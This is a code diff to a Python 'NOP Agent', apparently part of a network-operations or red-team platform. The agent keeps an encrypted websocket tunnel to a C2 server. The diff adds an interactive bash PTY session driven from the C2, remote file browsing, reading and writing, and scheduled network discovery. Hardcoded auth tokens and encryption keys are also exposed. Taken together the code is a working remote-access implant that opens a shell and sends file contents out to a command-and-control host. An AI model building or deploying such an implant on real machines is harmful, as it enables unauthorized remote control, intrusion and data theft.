@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-NOP Agent - test_agent_deicovery
-Generated: 2026-01-06T10:50:18.000636
+NOP Agent - pov_terminal_test
+Generated: 2026-01-07T14:38:45.626817
 Type: Python Proxy Agent
 Encryption: AES-256-GCM (Encrypted tunnel to C2)
 
@@ -9,7 +9,7 @@ This agent acts as a proxy, relaying all data from the remote network
 back to the NOP C2 server. All modules run here but data is processed
 on the main NOP instance.
 
-Download URL: {BASE_URL}/api/v1/agents/download/RWCO6Pm-L4TQ4zqZtyFmSX28WTc5KIoqqj2Q5NmPGzg
+Download URL: {BASE_URL}/api/v1/agents/download/pW5nKmGgPNf6Kqo-JjAUPaTp5I5YHebkhymQfYE7e8s
 
 INSTALLATION:
   pip3 install websockets psutil scapy cryptography netifaces
@@ -69,11 +69,11 @@ import base64
 import os
 
 # Agent Configuration
-AGENT_ID = "31fdd4d2-0713-4ad0-8fa9-4699b28c67ea"
-AGENT_NAME = "test_agent_deicovery"
-AUTH_TOKEN = "RvziZ2QAFRjzldqK2hn4aT-oJi2W9C5UsxNK-XVl5Vo"
-ENCRYPTION_KEY = "hNO0SFq7MQgLZhghDrtZThPblZGppjUA6-M12L2P5xY"
-SERVER_URL = "ws://172.28.0.1:8000/api/v1/agents/31fdd4d2-0713-4ad0-8fa9-4699b28c67ea/connect"
+AGENT_ID = "0450958f-e5f8-497e-8d08-8dd277472d6d"
+AGENT_NAME = "pov_terminal_test"
+AUTH_TOKEN = "mrAbzMGla8ScMOS_-fKmvjNcd4pSYihPbsrkfm1nGFc"
+ENCRYPTION_KEY = "Fjh976sqsh7tZf-cC0Pahzi7ptzMx9Jyt7U2y17isWg"
+SERVER_URL = "ws://172.28.0.1:8000/api/v1/agents/0450958f-e5f8-497e-8d08-8dd277472d6d/connect"
 CAPABILITIES = {'asset': True, 'traffic': True, 'host': True, 'access': True}
 CONFIG = {'connectback_interval': 30, 'heartbeat_interval': 30, 'data_interval': 60, 'connection_strategy': 'constant', 'max_reconnect_attempts': -1}
 
@@ -94,6 +94,16 @@ class NOPAgent:
         self.passive_hosts = []  # Track passively discovered hosts
         self.captured_flows = []  # Track captured network flows
         self.flow_lock = threading.Lock()  # Thread-safe flow access
+        self.terminal_sessions = {}  # session_id -> (master_fd, pid)
+        
+        # Extract nested discovery settings to top-level config
+        if 'settings' in self.config and 'discovery' in self.config['settings']:
+            discovery = self.config['settings']['discovery']
+            self.config['passive_discovery'] = discovery.get('passive_discovery', False)
+            self.config['sniff_interface'] = discovery.get('interface_name', 'eth1')
+            self.config['scan_subnet'] = discovery.get('network_range', '')
+            self.config['auto_discovery'] = discovery.get('discovery_enabled', False)
+            self.config['discovery_interval'] = discovery.get('discovery_interval', 300)
     
     def _init_cipher(self):
         """Initialize AES-GCM cipher for encrypted communication"""
@@ -159,33 +169,6 @@ class NOPAgent:
     async def noop(self):
         """No-op for disabled modules"""
         pass
-    def get_best_ip(self):
-        """Get best IP address, preferring internal networks (10.x, 192.168.x) over Docker"""
-        try:
-            import netifaces
-            best_ip = None
-            fallback_ip = None
-            
-            for iface in netifaces.interfaces():
-                if iface == 'lo':
-                    continue
-                addrs = netifaces.ifaddresses(iface)
-                if netifaces.AF_INET in addrs:
-                    for addr in addrs[netifaces.AF_INET]:
-                        ip = addr.get('addr')
-                        if ip:
-                            # Prefer 10.x or 192.168.x networks
-                            if ip.startswith('10.') or ip.startswith('192.168.'):
-                                best_ip = ip
-                                break
-                            elif not fallback_ip:
-                                fallback_ip = ip
-                if best_ip:
-                    break
-            
-            return best_ip or fallback_ip or socket.gethostbyname(socket.gethostname())
-        except Exception:
-            return socket.gethostbyname(socket.gethostname())
         
     async def register(self):
         """Register agent with C2 server"""
@@ -198,7 +181,7 @@ class NOPAgent:
                 "hostname": socket.gethostname(),
                 "platform": platform.system(),
                 "version": platform.version(),
-                "ip_address": self.get_best_ip()
+                "ip_address": socket.gethostbyname(socket.gethostname())
             }
         }
         await self.ws.send(json.dumps(registration))
@@ -251,8 +234,338 @@ class NOPAgent:
                     await self.send_pong()
                 elif msg_type == "settings_update":
                     await self.handle_settings_update(data)
+                # Terminal commands
+                elif msg_type == "terminal_start":
+                    await self.handle_terminal_start(data)
+                elif msg_type == "terminal_input":
+                    await self.handle_terminal_input(data)
+                elif msg_type == "terminal_resize":
+                    await self.handle_terminal_resize(data)
+                elif msg_type == "terminal_stop":
+                    await self.handle_terminal_stop(data)
+                # Filesystem commands
+                elif msg_type == "filesystem_browse":
+                    await self.handle_filesystem_browse(data)
+                elif msg_type == "filesystem_read":
+                    await self.handle_filesystem_read(data)
+                elif msg_type == "filesystem_write":
+                    await self.handle_filesystem_write(data)
             except Exception as e:
                 print(f"[{datetime.now()}] Message handling error: {e}")
+    
+    async def handle_terminal_start(self, data):
+        """Start a PTY terminal session"""
+        import pty
+        import os
+        import fcntl
+        import termios
+        import struct
+        
+        session_id = data.get("session_id")
+        if not session_id:
+            return
+            
+        try:
+            # Create PTY
+            master_fd, slave_fd = pty.openpty()
+            
+            # Fork a child process
+            pid = os.fork()
+            
+            if pid == 0:
+                # Child process
+                os.close(master_fd)
+                os.setsid()
+                
+                # Set up the slave as the controlling terminal
+                os.dup2(slave_fd, 0)
+                os.dup2(slave_fd, 1)
+                os.dup2(slave_fd, 2)
+                
+                if slave_fd > 2:
+                    os.close(slave_fd)
+                
+                # Execute shell
+                os.execvp('/bin/bash', ['/bin/bash', '-l'])
+            
+            # Parent process
+            os.close(slave_fd)
+            
+            # Set non-blocking mode
+            flags = fcntl.fcntl(master_fd, fcntl.F_GETFL)
+            fcntl.fcntl(master_fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
+            
+            # Store session
+            self.terminal_sessions[session_id] = (master_fd, pid)
+            
+            # Start reading from PTY in background
+            asyncio.create_task(self.read_terminal_output(session_id, master_fd))
+            
+            print(f"[{datetime.now()}] Terminal session started: {session_id}")
+            
+        except Exception as e:
+            print(f"[{datetime.now()}] Terminal start error: {e}")
+            await self.relay_to_c2({
+                "type": "terminal_output",
+                "session_id": session_id,
+                "data": f"\r\n\x1b[31mError starting terminal: {e}\x1b[0m\r\n"
+            })
+    
+    async def read_terminal_output(self, session_id, master_fd):
+        """Read PTY output and send to C2"""
+        import os
+        
+        while session_id in self.terminal_sessions:
+            try:
+                await asyncio.sleep(0.01)
+                try:
+                    data = os.read(master_fd, 4096)
+                    if data:
+                        await self.relay_to_c2({
+                            "type": "terminal_output",
+                            "session_id": session_id,
+                            "data": data.decode('utf-8', errors='replace')
+                        })
+                except OSError:
+                    pass
+            except asyncio.CancelledError:
+                break
+            except Exception as e:
+                break
+    
+    async def handle_terminal_input(self, data):
+        """Handle terminal input from C2"""
+        import os
+        
+        session_id = data.get("session_id")
+        input_data = data.get("data", "")
+        is_binary = data.get("is_binary", False)
+        
+        if session_id not in self.terminal_sessions:
+            return
+            
+        master_fd, pid = self.terminal_sessions[session_id]
+        
+        try:
+            if is_binary:
+                import base64
+                os.write(master_fd, base64.b64decode(input_data))
+            else:
+                os.write(master_fd, input_data.encode('utf-8'))
+        except Exception as e:
+            print(f"[{datetime.now()}] Terminal input error: {e}")
+    
+    async def handle_terminal_resize(self, data):
+        """Handle terminal resize from C2"""
+        import fcntl
+        import termios
+        import struct
+        
+        session_id = data.get("session_id")
+        cols = data.get("cols", 80)
+        rows = data.get("rows", 24)
+        
+        if session_id not in self.terminal_sessions:
+            return
+            
+        master_fd, pid = self.terminal_sessions[session_id]
+        
+        try:
+            winsize = struct.pack('HHHH', rows, cols, 0, 0)
+            fcntl.ioctl(master_fd, termios.TIOCSWINSZ, winsize)
+        except Exception as e:
+            print(f"[{datetime.now()}] Terminal resize error: {e}")
+    
+    async def handle_terminal_stop(self, data):
+        """Stop a terminal session"""
+        import os
+        
+        session_id = data.get("session_id")
+        
+        if session_id not in self.terminal_sessions:
+            return
+            
+        master_fd, pid = self.terminal_sessions[session_id]
+        
+        try:
+            os.close(master_fd)
+            os.kill(pid, 9)
+            os.waitpid(pid, 0)
+        except:
+            pass
+        
+        del self.terminal_sessions[session_id]
+        print(f"[{datetime.now()}] Terminal session stopped: {session_id}")
+    
+    async def handle_filesystem_browse(self, data):
+        """Browse filesystem and send response to C2"""
+        import os
+        from pathlib import Path
+        
+        request_id = data.get("request_id")
+        path = data.get("path", "/")
+        
+        try:
+            target_path = Path(path).resolve()
+            
+            if not target_path.exists():
+                await self.relay_to_c2({
+                    "type": "filesystem_response",
+                    "request_id": request_id,
+                    "data": {
+                        "current_path": path,
+                        "parent_path": str(target_path.parent) if target_path.parent != target_path else None,
+                        "items": [],
+                        "error": "Path does not exist"
+                    }
+                })
+                return
+            
+            if not target_path.is_dir():
+                await self.relay_to_c2({
+                    "type": "filesystem_response",
+                    "request_id": request_id,
+                    "data": {
+                        "current_path": path,
+                        "parent_path": str(target_path.parent),
+                        "items": [],
+                        "error": "Path is not a directory"
+                    }
+                })
+                return
+            
+            items = []
+            for item in target_path.iterdir():
+                try:
+                    stat = item.stat()
+                    items.append({
+                        "name": item.name,
+                        "path": str(item),
+                        "type": "directory" if item.is_dir() else "file",
+                        "size": stat.st_size if item.is_file() else 0,
+                        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
+                        "permissions": oct(stat.st_mode)[-3:],
+                    })
+                except (PermissionError, OSError) as e:
+                    items.append({
+                        "name": item.name,
+                        "path": str(item),
+                        "type": "unknown",
+                        "error": str(e)
+                    })
+            
+            # Sort: directories first, then by name
+            items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
+            
+            await self.relay_to_c2({
+                "type": "filesystem_response",
+                "request_id": request_id,
+                "data": {
+                    "current_path": str(target_path),
+                    "parent_path": str(target_path.parent) if target_path.parent != target_path else None,
+                    "items": items
+                }
+            })
+            
+        except Exception as e:
+            await self.relay_to_c2({
+                "type": "filesystem_response",
+                "request_id": request_id,
+                "data": {
+                    "current_path": path,
+                    "parent_path": None,
+                    "items": [],
+                    "error": str(e)
+                }
+            })
+    
+    async def handle_filesystem_read(self, data):
+        """Read file and send content to C2"""
+        from pathlib import Path
+        import base64
+        
+        request_id = data.get("request_id")
+        path = data.get("path")
+        
+        try:
+            target_path = Path(path).resolve()
+            
+            if not target_path.exists():
+                await self.relay_to_c2({
+                    "type": "filesystem_read_response",
+                    "request_id": request_id,
+                    "error": "File does not exist"
+                })
+                return
+            
+            # Limit file size to 1MB
+            if target_path.stat().st_size > 1024 * 1024:
+                await self.relay_to_c2({
+                    "type": "filesystem_read_response",
+                    "request_id": request_id,
+                    "error": "File too large (max 1MB)"
+                })
+                return
+            
+            try:
+                content = target_path.read_text()
+                is_binary = False
+            except UnicodeDecodeError:
+                content = base64.b64encode(target_path.read_bytes()).decode('utf-8')
+                is_binary = True
+            
+            await self.relay_to_c2({
+                "type": "filesystem_read_response",
+                "request_id": request_id,
+                "data": {
+                    "path": str(target_path),
+                    "content": content,
+                    "is_binary": is_binary,
+                    "size": target_path.stat().st_size
+                }
+            })
+            
+        except Exception as e:
+            await self.relay_to_c2({
+                "type": "filesystem_read_response",
+                "request_id": request_id,
+                "error": str(e)
+            })
+    
+    async def handle_filesystem_write(self, data):
+        """Write content to file"""
+        from pathlib import Path
+        import base64
+        
+        request_id = data.get("request_id")
+        path = data.get("path")
+        content = data.get("content", "")
+        is_binary = data.get("is_binary", False)
+        
+        try:
+            target_path = Path(path).resolve()
+            target_path.parent.mkdir(parents=True, exist_ok=True)
+            
+            if is_binary:
+                target_path.write_bytes(base64.b64decode(content))
+            else:
+                target_path.write_text(content)
+            
+            await self.relay_to_c2({
+                "type": "filesystem_write_response",
+                "request_id": request_id,
+                "data": {
+                    "path": str(target_path),
+                    "status": "success"
+                }
+            })
+            
+        except Exception as e:
+            await self.relay_to_c2({
+                "type": "filesystem_write_response",
+                "request_id": request_id,
+                "error": str(e)
+            })
                 
     async def handle_command(self, data):
         """Execute command from C2 based on module capabilities"""
@@ -275,13 +588,18 @@ class NOPAgent:
                 self.config["passive_discovery"] = discovery.get("passive_discovery", False)
                 self.config["sniff_interface"] = discovery.get("interface_name", "eth1")
                 self.config["scan_subnet"] = discovery.get("network_range", "")
+                self.config["auto_discovery"] = discovery.get("auto_discovery", False)
                 self.config["discovery_interval"] = discovery.get("discovery_interval", 300)
+                self.config["discovery_method"] = discovery.get("discovery_method", "arp")
                 self.config["track_source_only"] = discovery.get("track_source_only", False)
                 
                 print(f"[{datetime.now()}] Discovery config updated:")
                 print(f"  - Passive discovery: {self.config.get('passive_discovery')}")
+                print(f"  - Auto discovery: {self.config.get('auto_discovery')}")
                 print(f"  - Interface: {self.config.get('sniff_interface')}")
                 print(f"  - Network: {self.config.get('scan_subnet')}")
+                print(f"  - Interval: {self.config.get('discovery_interval')}s")
+                print(f"  - Method: {self.config.get('discovery_method')}")
                 
                 # Restart passive discovery if enabled
                 if self.config.get("passive_discovery"):
@@ -305,7 +623,17 @@ class NOPAgent:
         
         while self.running:
             try:
-                await asyncio.sleep(300)  # Run active scan every 5 minutes
+                # Get auto-discovery settings
+                auto_discovery = self.config.get('auto_discovery', False)
+                discovery_interval = self.config.get('discovery_interval', 300)
+                
+                # Wait for configured interval
+                await asyncio.sleep(discovery_interval)
+                
+                # Only run auto-discovery if enabled
+                if not auto_discovery:
+                    continue
+                
                 assets = await self.discover_assets()
                 
                 # Include passively discovered hosts
